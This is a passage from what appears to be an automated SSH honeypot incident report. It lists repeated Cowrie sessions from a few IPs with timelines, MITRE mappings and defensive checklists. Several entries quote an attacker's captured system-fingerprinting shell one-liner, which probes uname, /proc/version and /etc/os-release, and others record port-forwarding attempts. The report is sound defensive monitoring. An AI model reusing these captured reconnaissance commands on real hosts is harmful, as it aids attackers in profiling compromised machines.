| `2026-08-30 14:09:17` | `cowrie.command.input` |
| `2026-08-30 14:09:18` | `cowrie.log.closed` |
| `2026-08-30 14:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e789435bb26

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:09 |
| **Last Seen** | 2026-08-30 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:09:26` | `cowrie.session.connect` |
| `2026-08-30 14:09:26` | `cowrie.client.version` |
| `2026-08-30 14:09:26` | `cowrie.client.kex` |
| `2026-08-30 14:09:26` | `cowrie.login.success` |
| `2026-08-30 14:09:27` | `cowrie.session.params` |
| `2026-08-30 14:09:27` | `cowrie.command.input` |
| `2026-08-30 14:09:27` | `cowrie.log.closed` |
| `2026-08-30 14:09:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410b7ea50db7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:10 |
| **Last Seen** | 2026-08-30 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:10:16` | `cowrie.session.connect` |
| `2026-08-30 14:10:16` | `cowrie.client.version` |
| `2026-08-30 14:10:16` | `cowrie.client.kex` |
| `2026-08-30 14:10:17` | `cowrie.login.success` |
| `2026-08-30 14:10:17` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:10:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:10:18` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02016a18217a

| Field | Detail |
|---|---|
| **Source IP** | `81.228.174[.]248` |
| **First Seen** | 2026-08-30 14:10 |
| **Last Seen** | 2026-08-30 14:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:10:38` | `cowrie.session.connect` |
| `2026-08-30 14:10:38` | `cowrie.client.version` |
| `2026-08-30 14:10:38` | `cowrie.client.kex` |
| `2026-08-30 14:10:39` | `cowrie.login.success` |
| `2026-08-30 14:10:39` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.228.174[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.228.174[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e024bb63e1b8

| Field | Detail |
|---|---|
| **Source IP** | `186.238.242[.]194` |
| **First Seen** | 2026-08-30 14:10 |
| **Last Seen** | 2026-08-30 14:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:10:44` | `cowrie.session.connect` |
| `2026-08-30 14:10:45` | `cowrie.client.version` |
| `2026-08-30 14:10:45` | `cowrie.client.kex` |
| `2026-08-30 14:10:47` | `cowrie.login.success` |
| `2026-08-30 14:10:47` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.238.242[.]194` to AbuseIPDB if not already reported
- [ ] Block `186.238.242[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d38ea60783

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:10 |
| **Last Seen** | 2026-08-30 14:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:10:54` | `cowrie.session.connect` |
| `2026-08-30 14:10:55` | `cowrie.client.version` |
| `2026-08-30 14:10:55` | `cowrie.client.kex` |
| `2026-08-30 14:10:56` | `cowrie.login.success` |
| `2026-08-30 14:10:57` | `cowrie.session.params` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:57` | `cowrie.command.success` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:57` | `cowrie.command.input` |
| `2026-08-30 14:10:58` | `cowrie.log.closed` |
| `2026-08-30 14:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4538e85e9839

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:11 |
| **Last Seen** | 2026-08-30 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:11:56` | `cowrie.session.connect` |
| `2026-08-30 14:11:56` | `cowrie.client.version` |
| `2026-08-30 14:11:56` | `cowrie.client.kex` |
| `2026-08-30 14:11:56` | `cowrie.login.success` |
| `2026-08-30 14:11:57` | `cowrie.session.params` |
| `2026-08-30 14:11:57` | `cowrie.command.input` |
| `2026-08-30 14:11:57` | `cowrie.log.closed` |
| `2026-08-30 14:11:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e004f99245fc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:12 |
| **Last Seen** | 2026-08-30 14:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:12:37` | `cowrie.session.connect` |
| `2026-08-30 14:12:38` | `cowrie.client.version` |
| `2026-08-30 14:12:38` | `cowrie.client.kex` |
| `2026-08-30 14:12:39` | `cowrie.login.success` |
| `2026-08-30 14:12:40` | `cowrie.session.params` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:40` | `cowrie.command.success` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:40` | `cowrie.command.input` |
| `2026-08-30 14:12:41` | `cowrie.log.closed` |
| `2026-08-30 14:12:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a80c7da1497

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:14 |
| **Last Seen** | 2026-08-30 14:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:14:17` | `cowrie.session.connect` |
| `2026-08-30 14:14:18` | `cowrie.client.version` |
| `2026-08-30 14:14:18` | `cowrie.client.kex` |
| `2026-08-30 14:14:19` | `cowrie.login.success` |
| `2026-08-30 14:14:21` | `cowrie.session.params` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.command.success` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.command.input` |
| `2026-08-30 14:14:21` | `cowrie.log.closed` |
| `2026-08-30 14:14:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ca54616062

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:14 |
| **Last Seen** | 2026-08-30 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:14:30` | `cowrie.session.connect` |
| `2026-08-30 14:14:30` | `cowrie.client.version` |
| `2026-08-30 14:14:30` | `cowrie.client.kex` |
| `2026-08-30 14:14:30` | `cowrie.login.success` |
| `2026-08-30 14:14:31` | `cowrie.session.params` |
| `2026-08-30 14:14:31` | `cowrie.command.input` |
| `2026-08-30 14:14:31` | `cowrie.log.closed` |
| `2026-08-30 14:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21d4ddf05497

| Field | Detail |
|---|---|
| **Source IP** | `109.233.21[.]109` |
| **First Seen** | 2026-08-30 14:14 |
| **Last Seen** | 2026-08-30 14:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:14:41` | `cowrie.session.connect` |
| `2026-08-30 14:14:41` | `cowrie.client.version` |
| `2026-08-30 14:14:41` | `cowrie.client.kex` |
| `2026-08-30 14:14:43` | `cowrie.login.success` |
| `2026-08-30 14:14:43` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.233.21[.]109` to AbuseIPDB if not already reported
- [ ] Block `109.233.21[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d18f10f496e1

| Field | Detail |
|---|---|
| **Source IP** | `59.188.114[.]121` |
| **First Seen** | 2026-08-30 14:14 |
| **Last Seen** | 2026-08-30 14:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:14:48` | `cowrie.session.connect` |
| `2026-08-30 14:14:49` | `cowrie.client.version` |
| `2026-08-30 14:14:49` | `cowrie.client.kex` |
| `2026-08-30 14:14:50` | `cowrie.login.success` |
| `2026-08-30 14:14:51` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:14:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.188.114[.]121` to AbuseIPDB if not already reported
- [ ] Block `59.188.114[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-808d4c084c79

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:15 |
| **Last Seen** | 2026-08-30 14:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:15:55` | `cowrie.session.connect` |
| `2026-08-30 14:15:56` | `cowrie.client.version` |
| `2026-08-30 14:15:56` | `cowrie.client.kex` |
| `2026-08-30 14:15:57` | `cowrie.login.success` |
| `2026-08-30 14:15:59` | `cowrie.session.params` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.command.success` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.command.input` |
| `2026-08-30 14:15:59` | `cowrie.log.closed` |
| `2026-08-30 14:15:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b3d3a5dcd6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:16 |
| **Last Seen** | 2026-08-30 14:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:16:16` | `cowrie.session.connect` |
| `2026-08-30 14:16:16` | `cowrie.client.version` |
| `2026-08-30 14:16:16` | `cowrie.client.kex` |
| `2026-08-30 14:16:17` | `cowrie.login.success` |
| `2026-08-30 14:16:17` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:16:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:16:17` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ac29b603a0

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:17 |
| **Last Seen** | 2026-08-30 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:17:11` | `cowrie.session.connect` |
| `2026-08-30 14:17:11` | `cowrie.client.version` |
| `2026-08-30 14:17:11` | `cowrie.client.kex` |
| `2026-08-30 14:17:11` | `cowrie.login.success` |
| `2026-08-30 14:17:12` | `cowrie.session.params` |
| `2026-08-30 14:17:12` | `cowrie.command.input` |
| `2026-08-30 14:17:12` | `cowrie.log.closed` |
| `2026-08-30 14:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b46f92530c59

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:17 |
| **Last Seen** | 2026-08-30 14:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:17:35` | `cowrie.session.connect` |
| `2026-08-30 14:17:35` | `cowrie.client.version` |
| `2026-08-30 14:17:35` | `cowrie.client.kex` |
| `2026-08-30 14:17:37` | `cowrie.login.success` |
| `2026-08-30 14:17:38` | `cowrie.session.params` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.command.success` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.command.input` |
| `2026-08-30 14:17:38` | `cowrie.log.closed` |
| `2026-08-30 14:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-946b9dd74602

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 14:19 |
| **Last Seen** | 2026-08-30 14:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:19:16` | `cowrie.session.connect` |
| `2026-08-30 14:19:16` | `cowrie.client.version` |
| `2026-08-30 14:19:16` | `cowrie.client.kex` |
| `2026-08-30 14:19:17` | `cowrie.login.success` |
| `2026-08-30 14:19:19` | `cowrie.session.params` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.command.success` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.command.input` |
| `2026-08-30 14:19:19` | `cowrie.log.closed` |
| `2026-08-30 14:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c98175932a13

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:19 |
| **Last Seen** | 2026-08-30 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:19:41` | `cowrie.session.connect` |
| `2026-08-30 14:19:41` | `cowrie.client.version` |
| `2026-08-30 14:19:41` | `cowrie.client.kex` |
| `2026-08-30 14:19:41` | `cowrie.login.success` |
| `2026-08-30 14:19:42` | `cowrie.session.params` |
| `2026-08-30 14:19:42` | `cowrie.command.input` |
| `2026-08-30 14:19:42` | `cowrie.log.closed` |
| `2026-08-30 14:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f75d8acb514b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 14:21 |
| **Last Seen** | 2026-08-30 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 14:21:09` | `cowrie.session.connect` |
| `2026-08-30 14:21:09` | `cowrie.client.version` |
| `2026-08-30 14:21:10` | `cowrie.client.kex` |
| `2026-08-30 14:21:10` | `cowrie.login.success` |
| `2026-08-30 14:21:11` | `cowrie.direct-tcpip.request` |
| `2026-08-30 14:21:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 14:21:11` | `cowrie.direct-tcpip.data` |
| `2026-08-30 14:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-001e8703dc60

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 14:22 |
